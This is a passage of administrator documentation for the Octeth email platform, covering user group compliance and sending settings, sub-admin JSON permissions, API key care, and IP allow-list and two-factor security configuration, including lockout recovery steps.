Thresholds help users avoid hitting hard limits unexpectedly. Set them to 80-90% for best results.
:::

### Enforced Compliance Settings

**Force Unsubscription Link**
When enabled, users in this group **must** include an unsubscription link in all campaigns. The system will reject campaigns without this link. Recommended for compliance with email regulations.

**Force Reject Opt Link**
When enabled, requires a "reject opt-in" link in double opt-in confirmation emails. This allows recipients to reject the subscription during the confirmation process.

**Force Opt-In List**
When enabled, all lists created by users in this group must use double opt-in confirmation. Single opt-in is not allowed.

::: warning Compliance Best Practices
For most use cases, enable all three compliance settings to ensure adherence to anti-spam laws (CAN-SPAM, GDPR, etc.).
:::

### Email Header & Footer Templates

**Plain Email Header**
HTML content automatically added to the top of all plain-text emails sent by users in this group. Can include company branding, disclaimers, or required legal text.

**Plain Email Footer**
HTML content automatically added to the bottom of all plain-text emails. Typically includes contact information, unsubscribe links, and postal address (required by CAN-SPAM).

**HTML Email Header**
HTML content automatically added to the top of all HTML emails. Useful for inserting logos, navigation, or consistent branding.

**HTML Email Footer**
HTML content automatically added to the bottom of all HTML emails. Should include unsubscribe link, postal address, and social media links.

::: tip Header & Footer Usage
Use headers and footers to inject required compliance elements automatically, so users don't have to add them manually to every campaign.
:::

### Email Sending Configuration

**Send Method**
How emails will be delivered for users in this group. Options include:

- **System** - Use system-wide default sending configuration
- **SMTP** - Use custom SMTP server credentials
- **Local MTA** - Use server's local mail transfer agent (sendmail/postfix)
- **PHP Mail** - Use PHP's built-in mail() function (not recommended for production)
- **PowerMTA** - Use Port25 PowerMTA for high-volume sending
- **Save To Disk** - Save emails as files instead of sending (testing only)
- **SMTP-OCTETH** - Use Octeth's managed SMTP service
- **SMTP-SENDGRID** - Use SendGrid's SMTP service
- **SMTP-MAILGUN** - Use Mailgun's SMTP service
- **SMTP-MAILJET** - Use Mailjet's SMTP service
- **SMTP-SES** - Use Amazon SES SMTP interface
- **SMTP-POSTMARK** - Use Postmark's SMTP service

When selecting SMTP-based methods, you'll need to provide the appropriate credentials.

**SMTP Settings** (when Send Method is SMTP)

- **SMTP Host** - SMTP server hostname (e.g., `smtp.example.com`)
- **SMTP Port** - SMTP port number (typically 25, 587, or 465)
- **SMTP Secure** - Encryption method: none, `ssl`, or `tls`
- **SMTP Timeout** - Connection timeout in seconds
- **SMTP Authentication** - Enable if SMTP server requires authentication
- **SMTP Username** - SMTP account username
- **SMTP Password** - SMTP account password

**X-Mailer Header**
Custom value for the X-Mailer email header. Can be used for branding or tracking.

### Delivery Server Routing

**Target Delivery Server - Marketing**
Which delivery server to use for marketing campaigns (bulk emails). Select from your configured delivery servers.

**Target Delivery Server - Transactional**
Which delivery server to use for transactional emails (Email Gateway API). Transactional emails often require different sending reputation than marketing.

**Target Delivery Server - AutoResponder**
Which delivery server to use for autoresponder sequences. You can route different email types to different servers for better deliverability.

::: tip Delivery Server Strategy
Use separate delivery servers (and IP addresses) for transactional vs marketing emails. This protects your transactional email reputation if marketing campaigns hit spam traps.
:::

### Trial Group Settings

**Trial Group**
Enable this option to make this user group a trial/temporary group. Users in trial groups are automatically disabled after the trial period expires.

**Trial Expire Seconds**
Number of days until trial accounts expire. For example, set to `14` for a 14-day trial period.

::: info Trial Group Use Cases
Trial groups are perfect for:
- Free trial offers before requiring payment
- Demo accounts for sales prospects
- Time-limited testing accounts
:::

### Payment & Credit System

**Payment System**
Enable the payment system for this user group. When enabled, users are charged based on email sending volume and other usage metrics.

**Credit System**
Enable the credit-based system where users must have credits to send emails. Each email sent deducts credits from their balance.

**Payment System Charge Amount**
Monthly base fee charged to users in this group.

**Campaigns Per Campaign Cost**
Fixed cost charged per campaign sent.

**Campaigns Per Recipient**
Enable per-recipient billing for campaigns. Users are charged based on number of recipients.

**AutoResponders Charge Amount**
Monthly fee for autoresponder feature access.

**AutoResponders Per Recipient**
Enable per-recipient billing for autoresponder emails.

**Payment Pricing Range**
JSON configuration defining tiered pricing based on volume. Higher volumes typically get lower per-email costs.

::: warning Payment System Configuration
The payment system is complex and requires integration with payment processors. Most installations disable this and handle billing externally.
:::

### Sender Domain Management

**Sender Domain Management**
Enable advanced sender domain management features. When enabled, users can add and verify their own sending domains with SPF, DKIM, and DMARC records.

**Default Sender Domain Activate**
Enable automatic assignment of a default sender domain for users in this group.

**Default Sender Domain**
The domain automatically assigned to new users in this group (e.g., `yourdomain.com`).

**Default Sender Domain Monthly Limit**
Maximum number of emails that can be sent from the default sender domain per month.

::: tip Default Sender Domain Strategy
Provide a default sender domain for users who don't have their own domain. This allows them to send emails immediately while they set up their custom domain.
:::

### Email Gateway Settings

**Email Gateway DNS Template**
DNS record template to use for Email Gateway sender domains. Templates define required SPF, DKIM, and DMARC records.

**Email Gateway New Domain Manual Approval**
When enabled, new sender domains added to Email Gateway require administrator approval before they can be used. Useful for preventing abuse.

**Disable SES Plugins**
Disable Amazon SES-related plugins for this user group. Set to enabled if users should not access SES features.

### Email Campaign Settings

**Email Campaign DNS Template**
DNS record template to use for email campaign sender domains. Can differ from Email Gateway template.

**Disable List-Unsubscribe Header**
Remove the `List-Unsubscribe` email header from campaigns. Not recommended - this header helps deliverability.

::: danger List-Unsubscribe Header
Disabling this header can harm deliverability. Major email providers (Gmail, Yahoo, Outlook) use this header to provide one-click unsubscribe options. Keep this disabled (unchecked) unless you have a specific reason.
:::

### User Experience Settings

**Show Email Throughput**
Display real-time email sending throughput statistics in the user dashboard. Useful for users who want to monitor sending performance.

**Simplified Campaign Create UI**
Enable a streamlined campaign creation interface that hides advanced options. Recommended for non-technical users.

**Prevent Email Campaign Create If SpamAssassin Score Is Not Zero**
Block users from sending campaigns that don't pass SpamAssassin testing with a perfect score. Very strict - use cautiously.

::: warning SpamAssassin Prevention
Only enable this if you want to enforce extremely strict spam filtering. Most legitimate emails don't achieve a perfect SpamAssassin score. A score below 5.0 is generally acceptable.
:::

### Sender Information

**Enable Sender Info**
Allow users to configure sender information (company name, postal address) in their account settings.

**Forced Sender Info**
Require users to complete sender information before they can send campaigns. Helps ensure CAN-SPAM compliance.

### Subscription Plans

**Subscription Plan**
An identifier for the subscription plan associated with this user group (e.g., `starter`, `professional`, `enterprise`). Used for integration with billing systems.

**Subscription Plan Is Default**
Mark this user group as the default for the selected subscription plan. When users sign up for a plan, they're automatically assigned to the default group.

::: info Subscription Plan Workflow
Subscription plans integrate with payment processors and registration systems. When a user purchases "Professional Plan", they're automatically placed in the user group marked as default for that plan.
:::

### Rate Limits

**Default Rate Limits**
JSON configuration defining sending rate limits for this user group. Controls how quickly emails can be sent to prevent overwhelming SMTP servers or triggering spam filters.

Example configuration:
```json
{
  "hourly": 1000,
  "daily": 10000,
  "concurrent_connections": 10
}
```

::: tip Rate Limiting Strategy
Rate limits protect your sending reputation. Even with unlimited quotas, use rate limits to space out sending and avoid spam filter triggers. Start conservative: 1,000/hour for new domains, 10,000/hour for established domains.
:::

### Recommended Configuration

For most installations, we recommend the following user group settings for optimal deliverability and compliance:

**Enable Sender Information** → **Turn ON**
Enable **Enable Sender Info** and **Forced Sender Info** to ensure users provide company name and postal address. This is required for CAN-SPAM compliance and helps build trust with recipients.

**Force Unsubscribe Link** → **Turn ON**
Enable **Force Unsubscription Link** to require an unsubscribe link in all campaign emails. This is legally required in most jurisdictions and improves deliverability with major email providers.

**Simplified Campaign UI** → **Turn ON**
Enable **Simplified Campaign Create UI** to provide a streamlined, user-friendly campaign creation experience. This is especially helpful for non-technical users and reduces configuration errors.

**Sender Domain Management** → **Turn ON**
Enable **Sender Domain Management** to allow users to add and verify their own sending domains. This improves deliverability and sender reputation compared to using shared domains.

**Delivery Server Configuration** → **Required**
Before activating a user group, you must create at least one Delivery Server (under **Settings** → **Delivery Servers**) and assign it to all three delivery channels:

- **Target Delivery Server - Marketing** → Select your delivery server
- **Target Delivery Server - Transactional** → Select your delivery server
- **Target Delivery Server - AutoResponder** → Select your delivery server

Without configured delivery servers, users will not be able to send emails.

::: warning Delivery Server Requirement
User groups cannot send emails without assigned delivery servers. Configure your delivery servers first, then assign them to user groups.
:::

### Important Notes

- Changes to user group settings affect **all existing users** in that group, not just new users
- Users cannot change their own group - only administrators can reassign users to different groups
- Create separate user groups for different customer tiers or use cases rather than trying to make one group fit all needs
- Test new user group configurations with a test user account before deploying to production users

## Settings Walkthrough

Octeth's System Settings provide comprehensive control over your email marketing platform. This walkthrough guides you through each settings section, explaining what each option does and how to configure it for optimal performance and security.

All system settings are accessed through the administrator dashboard by clicking **Preferences** in the top navigation menu, then selecting **System Settings** from the dropdown.

Each settings section controls a specific aspect of your Octeth installation:
- Account and security settings for administrators
- Email delivery infrastructure and routing
- SMS gateway configuration
- Integration with external services
- User interface customization and branding
- System-wide preferences and behaviors

As you go through each section, you'll notice some settings are critical for initial setup (like delivery servers and administrator credentials), while others are optional enhancements you can configure later based on your specific needs.

::: tip Configuration Best Practice
Before making changes to system settings, it's a good idea to document your current configuration. Take screenshots or note down current values so you can revert if needed. Some settings affect email deliverability and user experience immediately.
:::

Let's walk through each settings section in detail.

## Administrator Account

The Administrator Account section is where you manage your own administrator profile, configure system email settings, and access your API key. These settings control how you log in to Octeth and how the system sends notifications and alerts.

To access these settings, navigate to **Preferences** → **System Settings** → **Admin Account** in the administrator dashboard.

### Account Information

This tab contains your personal administrator account details and login credentials.

**Name**
Your full name as the system administrator. This name appears in system logs and may be visible in certain administrative interfaces.

**Email Address**
The email address associated with your administrator account. This address is used for:
- Password recovery if you forget your login credentials
- Important system notifications about your Octeth installation
- Administrative alerts and updates

::: tip
Use a reliable email address that you check regularly. Losing access to this email could make account recovery difficult.
:::

**Username**
Your login username for accessing the Octeth administrator dashboard. This is the username you enter on the login page.

::: info
The username cannot be changed once your account is created. If you need to change it, you'll need to create a new administrator account.
:::

**New Password**
Use this field to change your administrator password. Leave this field blank if you want to keep your current password.

::: warning
Choose a strong password with at least 12 characters, including uppercase letters, lowercase letters, numbers, and symbols. Your administrator account has complete control over your Octeth installation, so password security is critical.
:::

**Best Practices for Account Information:**
- Use your actual name in the **Name** field for accountability in system logs
- Keep your email address up to date
- Change your password regularly (every 90 days is recommended)
- Never share your administrator credentials with anyone

### Email Addresses

This tab configures the email addresses and sender information used for system-generated notifications.

**Sender Name**
The name that appears in the "From" field when Octeth sends system notification emails. This might include alerts about user activity, system errors, or threshold warnings.

Example: If you set this to "Octeth Admin Team", recipients will see emails from "Octeth Admin Team" in their inbox.

**Sender Email**
The email address used in the "From" field for system notification emails. This should be a valid email address on a domain you control.

::: tip
Use a dedicated email address for system notifications, such as `noreply@yourdomain.com` or `alerts@yourdomain.com`. This keeps system emails separate from your personal correspondence.
:::

**Send Alerts To**
The email address where Octeth sends important system alerts. These alerts include:
- User threshold warnings (when users are approaching or exceeding their limits)
- System health notifications
- Critical errors or issues requiring administrator attention

::: info
This can be the same as your administrator email address, or you can route alerts to a team inbox or monitoring system.
:::

**Best Practices for Email Addresses:**
- Ensure the **Sender Email** domain has proper SPF and DKIM records configured to avoid deliverability issues
- Use a monitored email address for **Send Alerts To** so you don't miss important system notifications
- Consider using your company name or product name in **Sender Name** for professional appearance
- Test system emails after configuring these settings to ensure they're delivered correctly

### API

This tab displays your administrator API key, which provides access to administrator-only API endpoints and system configuration.

**API Key**
This unique key authenticates API requests that require administrator privileges. The API key grants full access to:
- Administrator-only API endpoints
- System configuration via API
- Advanced automation and integration capabilities

The API key is displayed in a read-only field. You cannot edit it directly, but you can regenerate it if needed.

::: danger Security Warning
Your API key provides complete administrator-level access to your Octeth installation. Treat it like a password:
- Never share it publicly or commit it to version control systems
- Never embed it directly in client-side code or public websites
- Store it securely using environment variables or secret management tools
- Regenerate the key immediately if you suspect it has been compromised
:::

::: tip
If you're using the API key in scripts or applications, store it in an environment variable rather than hardcoding it in your source code. This makes it easier to rotate the key if needed and keeps it out of version control.
:::

**When to Use the API Key:**
- Automating administrative tasks via scripts
- Integrating Octeth with other business systems
- Building custom monitoring or reporting tools
- Performing bulk operations that aren't available in the UI

**Security Best Practices for API Access:**
1. Only use the API key on secure, trusted servers
2. Never transmit the API key over unencrypted connections (always use HTTPS)
3. Implement IP whitelisting if your infrastructure supports it
4. Rotate the API key periodically (every 6-12 months)
5. Monitor API access logs for suspicious activity
6. Revoke and regenerate the key immediately if a team member with API access leaves your organization

::: details How to Regenerate Your API Key
If you need to regenerate your API key (for example, if it's been compromised or you want to rotate it for security purposes):

1. Contact Octeth support or use the regeneration feature if available in your version
2. Update all applications and scripts that use the old key
3. Test thoroughly to ensure everything works with the new key
4. Document the key change and update any stored credentials

Note: Regenerating the API key will immediately invalidate the old key, breaking any applications or scripts that use it.
:::

After configuring your Administrator Account settings, click the **UPDATE ADMINISTRATOR ACCOUNT** button at the bottom of the page to save your changes.

## Sub-Administrator Accounts

Sub-Administrator Accounts allow you to grant limited administrative access to team members without giving them full control over your Octeth installation. This feature is essential for delegating responsibilities while maintaining security and accountability.

To access this section, navigate to **Preferences** → **System Settings** → **Sub Admin Accounts** in the administrator dashboard.

### What Are Sub-Admin Accounts?

A sub-administrator account is a restricted admin account that can only access specific parts of the Octeth system. Unlike the main administrator account, which has complete control over all settings and users, sub-admin accounts are limited to the permissions you grant them.

**Common use cases for sub-admin accounts:**

- **User Support Team** - Give support staff access to manage users and view reports without allowing them to change system settings
- **Client Services** - Allow account managers to browse and edit specific user groups without access to delivery servers or system configuration
- **Marketing Team** - Grant your marketing team access to campaign management and reports without exposing sensitive system settings
- **Junior Administrators** - Provide limited access to new team members as they learn the system
- **Contractors** - Give temporary administrative access to consultants or contractors with clearly defined boundaries

::: info
The main administrator account always retains full control. Sub-admin accounts cannot create other sub-admin accounts or modify system-level settings unless explicitly granted those permissions.
:::

### Viewing Sub-Admin Accounts

The Sub Admin Accounts page displays a list of all existing sub-administrator accounts with their name and email address. If no sub-admin accounts exist, you'll see a message prompting you to create your first one.

From this page, you can:
- **Create** new sub-admin accounts using the "Create a sub admin account" button
- **Edit** existing accounts by clicking on their name
- **Delete** accounts by selecting them and clicking the Delete button

::: warning
Deleting a sub-admin account is permanent and cannot be undone. The sub-admin will immediately lose access to the administrator dashboard. Make sure to remove their access intentionally and communicate with the team member beforehand.
:::

### Creating a Sub-Admin Account

Follow these steps to create a new sub-administrator account:

1. Navigate to **Preferences** → **System Settings** → **Sub Admin Accounts**
2. Click the **Create a sub admin account** button
3. Fill in the account information (see below)
4. Configure permissions (see below)
5. Click **CREATE** to save the account

The sub-admin will then be able to log in using their username and password at your Octeth administrator login URL.

#### Account Information Tab

This tab contains the basic details for the sub-admin account.

**Name**
The full name of the person who will use this account. This name appears in system logs and helps you identify who made which changes.

**Email Address**
The contact email address for this sub-administrator. This email is used for:
- Password recovery if they forget their login credentials
- System notifications relevant to their permissions
- Communication about account status changes

**Username**
The login username for this sub-admin account. They'll enter this username when logging into the administrator dashboard.

::: tip
Use a clear naming convention for usernames, such as `firstname.lastname` or `role.firstname`. This makes it easier to identify accounts in logs and when managing multiple sub-admins.
:::

**Password**
Set a secure password for this account. You can:
- Enter a password manually in the field
- Click **Generate a strong password** to automatically create a secure random password

::: warning
Make sure to securely share the password with the sub-admin. Consider using a password manager or secure communication channel. Never send passwords via unencrypted email.
:::

**Best Practices for Account Information:**
- Use real names to maintain accountability
- Use business email addresses (not personal accounts) for professional environments
- Generate strong passwords and encourage sub-admins to change them on first login
- Keep a record of which sub-admin accounts exist and who has access to them

#### Permissions Tab

The Permissions tab is where you define exactly what this sub-admin can access and do within Octeth. Permissions are configured using a JSON (JavaScript Object Notation) structure.

::: info What is JSON?
JSON is a simple text format for storing structured data. Don't worry if you're not familiar with it - we'll provide ready-to-use examples below that you can copy and modify.
:::

The permissions configuration has two main parts:

**1. AccessAllowedUserGroupIDs**
This is an array (list) of user group IDs that this sub-admin can manage. If this array is empty `[]`, the sub-admin cannot access any user groups.

Example:
```json
"AccessAllowedUserGroupIDs": [1, 3, 5]
```

This means the sub-admin can only manage users in groups 1, 3, and 5. They won't see users from other groups.

::: tip Finding User Group IDs
To find a user group's ID, navigate to **Users** → **User Groups** and look at the URL when viewing or editing a group. The ID is the number in the URL after `/usergroups/`. For example, if the URL is `/app/admin/usergroups/edit/3`, the ID is `3`.
:::

**2. AccessOptions**
This is an array of permission strings that control which sections of Octeth this sub-admin can access and what actions they can perform.

Example:
```json
"AccessOptions": [
  "Users",
  "User.Browse",
  "User.Edit"
]
```

Common permission strings include:
- `Users` - Access to the Users section
- `User.Browse` - Ability to view user accounts
- `User.Edit` - Ability to edit user accounts
- `User.Create` - Ability to create new user accounts
- `User.Delete` - Ability to delete user accounts
- `Campaigns` - Access to email campaigns
- `Campaign.Browse` - Ability to view campaigns
- `Campaign.Edit` - Ability to edit campaigns
- `Reports` - Access to reports and analytics
- `DeliveryServers` - Access to delivery server settings
- `SystemSettings` - Access to system-wide settings

::: details Click here to learn how to set permissions
To customize permissions for your sub-admin:

1. Click the "Click here" link below the permissions editor for detailed documentation
2. Review the available permission strings for your Octeth version
3. Copy one of the example configurations below
4. Modify the user group IDs and permission strings to match your needs
5. Paste the configuration into the Permissions field

The permissions system uses a hierarchical structure. For example:
- Granting `Users` gives general access to the Users section
- Adding `User.Browse` allows viewing user details
- Adding `User.Edit` allows modifying user information

You typically need both the parent permission (`Users`) and the specific action (`User.Edit`) for the sub-admin to perform that action.
:::

### Common Permission Configurations

Here are ready-to-use permission configurations for common scenarios. Copy and paste these into the Permissions field, then modify the user group IDs as needed.

**1. User Support Representative**
Can browse and edit users in specific groups, but cannot delete users or access system settings:

```json
{
  "AccessAllowedUserGroupIDs": [1, 2],
  "AccessOptions": [
    "Users",
    "User.Browse",
    "User.Edit"
  ]
}
```

**2. Campaign Manager**
Can create, edit, and send campaigns, and view reports, but cannot manage users or system settings:

```json
{
  "AccessAllowedUserGroupIDs": [],
  "AccessOptions": [
    "Campaigns",
    "Campaign.Browse",
    "Campaign.Create",
    "Campaign.Edit",
    "Campaign.Send",
    "Reports"
  ]
}
```

**3. Account Manager**
Can fully manage users in assigned groups and view their campaign performance:

```json
{
  "AccessAllowedUserGroupIDs": [3, 4, 5],
  "AccessOptions": [
    "Users",
    "User.Browse",
    "User.Create",
    "User.Edit",
    "User.Delete",
    "Reports"
  ]
}
```

**4. Read-Only Auditor**
Can view users, campaigns, and reports, but cannot make any changes:

```json
{
  "AccessAllowedUserGroupIDs": [1, 2, 3, 4, 5],
  "AccessOptions": [
    "Users",
    "User.Browse",
    "Campaigns",
    "Campaign.Browse",
    "Reports"
  ]
}
```

**5. Technical Administrator**
Can manage delivery servers and system settings, but not users:

```json
{
  "AccessAllowedUserGroupIDs": [],
  "AccessOptions": [
    "DeliveryServers",
    "DeliveryServer.Browse",
    "DeliveryServer.Create",
    "DeliveryServer.Edit",
    "SystemSettings",
    "Reports"
  ]
}
```

::: tip Starting with Minimal Permissions
When in doubt, start with fewer permissions and add more as needed. It's easier (and safer) to grant additional access later than to revoke permissions that were too broad. Begin with browse-only access and gradually add edit/create/delete permissions based on the sub-admin's responsibilities.
:::

### Security Best Practices

Follow these security guidelines when managing sub-admin accounts:

**Account Management:**
1. **Use the principle of least privilege** - Only grant the minimum permissions needed for each sub-admin to do their job
2. **Create separate accounts for each person** - Never share sub-admin accounts between multiple team members
3. **Review permissions regularly** - Audit sub-admin access every 3-6 months and remove unnecessary permissions
4. **Disable accounts promptly** - Delete or disable sub-admin accounts immediately when team members leave or change roles
5. **Document who has access** - Keep a record of all sub-admin accounts, who they belong to, and what permissions they have

**Password Security:**
1. **Require strong passwords** - Use the "Generate a strong password" feature or enforce strong password requirements
2. **Encourage password changes** - Ask sub-admins to change their password after first login
3. **Never share passwords** - Each person should have their own unique credentials
4. **Use secure communication** - Share initial passwords through encrypted channels, not email

**Permission Security:**
1. **Limit user group access** - Only grant access to user groups the sub-admin needs to manage
2. **Restrict system settings** - Reserve SystemSettings and DeliveryServers permissions for trusted team members
3. **Monitor activity** - Regularly review system logs to ensure sub-admins are using their access appropriately
4. **Separate concerns** - Don't give billing/financial access to the same people who have technical access

::: danger Critical Security Warning
Sub-admin accounts with `SystemSettings` permissions can make changes that affect your entire Octeth installation, including email deliverability and system security. Only grant these permissions to highly trusted team members who understand the implications of system-level changes.
:::

### Managing Existing Sub-Admin Accounts

To edit an existing sub-admin account:

1. Navigate to **Preferences** → **System Settings** → **Sub Admin Accounts**
2. Click on the name of the sub-admin you want to edit
3. Update the account information or permissions as needed
4. Click **UPDATE** to save your changes

To delete a sub-admin account:

1. Navigate to **Preferences** → **System Settings** → **Sub Admin Accounts**
2. Check the box next to the sub-admin account(s) you want to delete
3. Click the **Delete** button
4. Confirm the deletion

::: warning
Changes to permissions take effect immediately. If you edit a sub-admin's permissions while they're logged in, they may need to log out and log back in for the changes to fully apply.
:::

### Troubleshooting

**Sub-admin can't see any users**

Make sure the `AccessAllowedUserGroupIDs` array contains the IDs of the user groups they should access. An empty array `[]` means they can't see any users.

**Sub-admin can't perform actions they should be able to**

Check that you've granted both the parent permission and the specific action permission. For example, to edit users, they need both `Users` and `User.Edit`.

**Sub-admin sees an "Access Denied" message**

This means they're trying to access a section they don't have permission for. Review their `AccessOptions` array and add the necessary permissions.

**JSON permissions show an error**

Make sure your JSON is properly formatted:
- All strings are in double quotes: `"Users"` not `'Users'`
- Arrays use square brackets: `[1, 2, 3]`
- Objects use curly braces: `{ }`
- Commas separate items, but don't add a comma after the last item

If you're unsure, copy one of the example configurations above and modify it carefully.

After creating or editing a sub-admin account, the new credentials and permissions take effect immediately. The sub-admin can log in at your Octeth administrator URL using their username and password.

## Security

Security settings help protect your Octeth installation from unauthorized access by restricting which IP addresses can access your system and by enabling two-factor authentication for administrator accounts.

To access these settings, navigate to **Preferences** → **System Settings** → **Security** in the administrator dashboard.

::: danger Critical Warning
The security settings on this page can lock you out of your Octeth installation if configured incorrectly. Always test IP restrictions carefully and have a backup access method (such as server console access) available before making changes.
:::

### Authorized IP Addresses

The Authorized IP Addresses feature allows you to restrict access to the Octeth administrator area to specific IP addresses or IP ranges. This is a powerful security measure that prevents unauthorized access even if someone obtains valid administrator credentials.

**How It Works:**

When you add IP addresses to this field, only visitors connecting from those IP addresses will be able to access the administrator login page and dashboard. Anyone connecting from other IP addresses will be blocked from accessing the admin area.

::: warning Changed in v6.0.0: the list is now checked on every admin request
Before v6.0.0 the list was consulted **only while the admin login page rendered**. A session that was already open, and the "remember me" cookie, kept working from any address, so a stolen session cookie stayed usable for the full session lifetime from anywhere.

From v6.0.0 the list is checked on every authenticated admin request: every admin screen, every plugin admin screen, and before the "remember me" cookie can sign anybody in. An admin whose address is not on the list is signed out on their next request, even if they are signed in right now.

A refused request has its admin session **destroyed**, not merely rejected, and is sent to the login page, which explains that the address is not allowed. Removing the restriction afterwards does not revive the old session; the admin signs in again. Refusals are written to the application log at ERROR level with the address that was refused, so a lockout can be diagnosed from `data/logs/`.
:::

**Requests from the server itself are exempt.** A request whose resolved client address is `127.0.0.1` or `::1` is always allowed through. That is the server talking to itself: the internal health check and the cron probes. Without the exemption, turning the list on would make `system.health.check` report a failure. This is not a bypass for an outside visitor, because a request that arrived over the network never resolves to loopback.

::: danger Check TRUSTED_PROXIES first, or the list will match the wrong address
The address compared against this list is the one Octeth resolved for the visitor.

**Before v6.0.0 that address was Octeth's own front-end container on every install**, so a list filled in on an older version was never comparing your visitors. If it contained a `192.168.99.x` address it was admitting everybody; if it contained a real public address it was refusing everybody. v6.0.0 resolves the real address, so review what is in the list when you upgrade.

The same failure still applies to a proxy of your own: if you have put a load balancer, reverse proxy or CDN in front of Octeth at an address that is not loopback and have not listed it in `TRUSTED_PROXIES`, Octeth records **that proxy's** address for every visitor, and the list compares the proxy rather than the person.

Confirm the address Octeth sees **before** you enable the restriction. It is shown in the admin footer and in the login and audit logs. If it is the same for every visitor, set `TRUSTED_PROXIES` (and `TRUST_CLOUDFLARE_CONNECTING_IP=true` if you are behind Cloudflare), restart the app containers, and confirm the footer shows a real visitor address. Only then fill in Authorized IP Addresses.
:::

**A proxy rule on the `/app/admin/` path does not restrict the admin area.** It is tempting to add an IP restriction at the reverse proxy on that path prefix instead. It does not work: Octeth's front controller takes the route from the path or from the query string, so the admin area answers at several URL shapes that all reach the same controllers.

```
/app/admin/
/app/index.php?/admin/
/app/index.php?/admin
/app/index.php/admin/
/app/?/admin/
/app/index.php?//admin/
```

A rule matching `/app/admin/` covers the first one only. Authorized IP Addresses is enforced in the authentication check, after the route has been resolved, so it covers every shape. Treat the in-app list as the authoritative control and any proxy rule as an extra layer on top of it.

**Related setting.** `ADMIN_API_ENFORCE_ALLOWED_IP` in `.oempro_env` applies the same list to admin-authenticated API calls through `api.php`. It is a separate switch and it has **no loopback exemption**, so an integration that calls `api.php` with an admin credential from inside the Docker network needs its address added to the list. The admin-area enforcement described here is not behind a switch: it applies whenever the list is non-empty.

**To configure authorized IP addresses:**

1. Enter one IP address per line in the **Authorized IP Addresses** text area
2. You can use individual IP addresses or CIDR notation for IP ranges
3. Leave the field blank to allow access from any IP address (default behavior)
4. Click **UPDATE SECURITY SETTINGS** to save your changes

**IP Address Formats:**

You can enter IP addresses in several formats:

**Single IP Address:**
```
203.0.113.45
192.168.1.100
```

**Multiple IP Addresses (one per line):**
```
203.0.113.45
198.51.100.78
192.0.2.123
```

**CIDR Notation (IP Ranges):**
```
203.0.113.0/24
192.168.1.0/24
10.0.0.0/8
```

::: info What is CIDR Notation?
CIDR (Classless Inter-Domain Routing) notation allows you to specify a range of IP addresses using a slash followed by a number. For example:
- `192.168.1.0/24` includes all IP addresses from 192.168.1.0 to 192.168.1.255 (256 addresses)
- `10.0.0.0/8` includes all IP addresses from 10.0.0.0 to 10.255.255.255 (16.7 million addresses)
- `203.0.113.0/28` includes IP addresses from 203.0.113.0 to 203.0.113.15 (16 addresses)

Use CIDR notation when you want to allow access from an entire office network or data center.
:::

**Common Use Cases:**

**Office Network Access Only:**
```
203.0.113.0/24
```
Only allows access from your office's IP range.

**Multiple Office Locations:**
```
203.0.113.0/24
198.51.100.0/24
192.0.2.0/28
```
Allows access from multiple office networks.

**Office + Home Office + VPN:**
```
203.0.113.50
198.51.100.78
192.0.2.100
10.8.0.0/24
```
Allows access from office, specific home IPs, and VPN IP range.

::: danger Lockout Risk
If you enter IP addresses and save the settings, you will immediately lose access to the administrator area if your current IP address is not on the list. Before clicking **UPDATE SECURITY SETTINGS**, make absolutely certain that:

1. Your current IP address is included in the list
2. You know how to access your server directly (SSH/console) to revert the changes if needed
3. You've tested the IP addresses are correct

**To find your current IP address:** Search "what is my IP" in Google, or the security page may display it for you. Write it down before making changes.

**If you do lock yourself out**, either of these gets you back in.

1. **Sign in from the server itself.** Loopback is exempt, so an admin session opened on the server, for example through an SSH tunnel to the application's own port, still works. Clear the field from Settings, Security.
2. **Clear the setting in the database.** The value lives in the `ADMIN_ALLOWED_IP` column of the single `oempro_config` row, and an empty value means no restriction. That row is cached, so drop the cache entry afterwards or the application keeps serving the old value.

   ```sql
   UPDATE oempro_config SET ADMIN_ALLOWED_IP = '' WHERE ConfigID = 1;
   ```

   ```bash
   docker exec oempro_redis redis-cli DEL system_config_1
   ```

**Check the log first.** From v6.0.0 the refusal is logged at ERROR level with the address that was refused, which is often the whole answer: it shows you either the address to add, or that `TRUSTED_PROXIES` is the real problem.
:::

::: tip Testing IP Restrictions Safely
Before implementing IP restrictions in production:

1. **Find your current IP address** and add it to the list first
2. **Open a second browser** (or incognito window) while keeping your current session active
3. **Try logging in** with the new browser to verify your IP is whitelisted
4. **Only close your original session** after confirming the new session works
5. **Keep server SSH access** available as a backup to revert changes if needed

This way, if something goes wrong, you still have an active session to fix the configuration.
:::

### User Area IP Restrictions

Below the Authorized IP Addresses field, you'll find a checkbox labeled **"Disable access to the user area from IP addresses not listed above"**.

**How It Works:**

When this checkbox is enabled, the IP restrictions you configured above apply not only to the administrator area but also to the user area (where your regular users log in to manage their campaigns and subscribers).

- **Unchecked (Default):** IP restrictions only apply to the administrator area. Regular users can log in from anywhere.
- **Checked:** IP restrictions apply to both administrator and user areas. Only visitors from whitelisted IPs can access either area.

**When to Use This:**

Enable user area IP restrictions when:
- You're running an internal email platform for employees only
- Your users all work from the same office or VPN
- You want maximum security for a private installation
- Compliance requirements mandate IP-based access control

**When NOT to Use This:**

Don't enable user area IP restrictions when:
- Your users work remotely from various locations
- Users travel and need access from different networks
- You're running a public SaaS platform
- Users access from mobile networks (which have changing IPs)

::: warning User Area Lockouts
If you enable this option and users try to log in from unauthorized IP addresses, they will see a 403 Forbidden error page. Make sure all your users' IP addresses or networks are included in the authorized list before enabling this feature, or you'll receive support complaints from locked-out users.
:::

### Two Factor Authentication Settings

Two-factor authentication (2FA) adds an extra layer of security to your administrator account. Even if someone steals or guesses your password, they won't be able to log in without the 6-digit code from your authenticator app.

**How It Works:**

Once 2FA is enabled, logging into the administrator area requires two things:
1. Your username and password (something you know)
2. A 6-digit code from your authenticator app (something you have)

The 6-digit code changes every 30 seconds, making it virtually impossible for attackers to gain access even if they have your password.

**Setting Up Two-Factor Authentication:**

Follow these steps to enable 2FA on your administrator account:

1. Navigate to **Preferences** → **System Settings** → **Security**
2. Scroll down to the **Two Factor Authentication Settings** section
3. You'll see a QR code and an alphanumeric secret key
4. Install an authenticator app on your smartphone if you haven't already:
   - **Google Authenticator** ([iOS](https://apps.apple.com/app/google-authenticator/id388497605) / [Android](https://play.google.com/store/apps/details?id=com.google.android.apps.authenticator2))
   - **Authy** ([iOS](https://apps.apple.com/app/authy/id494168017) / [Android](https://play.google.com/store/apps/details?id=com.authy.authy))
   - **Microsoft Authenticator** ([iOS](https://apps.apple.com/app/microsoft-authenticator/id983156458) / [Android](https://play.google.com/store/apps/details?id=com.azure.authenticator))
5. Open your authenticator app and scan the QR code displayed on the screen
